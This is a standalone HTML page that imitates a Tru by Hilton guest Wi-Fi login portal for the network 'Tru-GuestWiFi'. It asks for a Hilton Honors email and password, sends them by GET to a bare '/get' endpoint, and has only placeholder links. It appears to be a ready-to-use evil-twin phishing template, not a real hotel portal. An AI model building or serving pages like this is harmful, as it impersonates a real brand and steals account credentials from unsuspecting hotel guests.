<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Tru by Hilton — Guest Internet</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#f4f1e0;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
.card{background:#fff;width:100%;max-width:420px;border-radius:16px;overflow:hidden;box-shadow:0 24px 64px rgba(0,0,0,0.18)}
.card-top{background:#FFD700;padding:30px 26px 22px;text-align:center}
.bname{font-size:22px;font-weight:900;color:#fff;letter-spacing:0.4px;line-height:1.2}
.bsub{font-size:10px;color:rgba(255,255,255,0.6);letter-spacing:2.5px;text-transform:uppercase;margin-top:6px}
.card-mid{background:#E6C200;padding:9px 22px;display:flex;align-items:center;gap:9px}
.dot{width:7px;height:7px;background:#4ade80;border-radius:50%;flex-shrink:0;box-shadow:0 0 0 3px rgba(74,222,128,0.25)}
.ssid{font-size:12px;color:rgba(255,255,255,0.85);font-weight:500}
.ssid strong{font-weight:700;color:#fff}
.card-body{padding:26px 24px 20px}
h2{font-size:17px;font-weight:700;color:#1a1a1a;margin-bottom:3px}
.sub{font-size:13px;color:#aaa;margin-bottom:4px}
.lbl{display:block;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:1px;color:#888;margin-bottom:7px;margin-top:18px}
input{width:100%;padding:13px 15px;border:1.5px solid #eaeaea;border-radius:10px;font-size:15px;background:#fafafa;color:#1a1a1a}
input:focus{outline:none;border-color:#FFD700;box-shadow:0 0 0 3px #FFD70015}
input::placeholder{color:#ccc}
.forgot{display:block;text-align:right;font-size:12px;color:#FFD700;text-decoration:none;margin-top:8px}
.btn{width:100%;padding:14px;border:none;border-radius:10px;background:#FFD700;color:#fff;font-size:14px;font-weight:800;letter-spacing:0.5px;cursor:pointer;margin-top:20px}
.btn:active{opacity:0.9}
.terms{font-size:11.5px;color:#ccc;text-align:center;margin-top:13px;line-height:1.6}
.terms a{color:#FFD700;text-decoration:none}
.card-foot{background:#f8f8f8;border-top:1px solid #f0f0f0;padding:12px 24px;display:flex;justify-content:space-between;align-items:center}
.card-foot span{font-size:11px;color:#ccc}
.card-foot a{font-size:11px;color:#FFD700;text-decoration:none}
</style>
</head>
<body>
<div class="card">
  <div class="card-top">
    <div class="bname">Tru by Hilton</div>
    <div class="bsub">Affordable. Stylish. Social.</div>
  </div>
  <div class="card-mid">
    <div class="dot"></div>
    <span class="ssid">Network: <strong>Tru-GuestWiFi</strong></span>
  </div>
  <div class="card-body">
    <h2>Guest Internet Access</h2>
    <p class="sub">Sign in with your Hilton Honors account to connect.</p>
    <form action="/get">
      <label class="lbl">Email Address</label>
      <input name="email" type="text" placeholder="you@example.com" required>
      <label class="lbl">Password</label>
      <input name="password" type="password" placeholder="Enter your password" required>
      <a href="#" class="forgot">Forgot password?</a>
      <button type="submit" class="btn">Connect to Internet &rarr;</button>
      <p class="terms">By connecting you agree to our <a href="#">Internet Use Policy</a>.</p>
    </form>
  </div>
  <div class="card-foot">
    <span>&copy; Tru by Hilton</span>
    <a href="#">Concierge</a>
  </div>
</div>
</body>
</html>
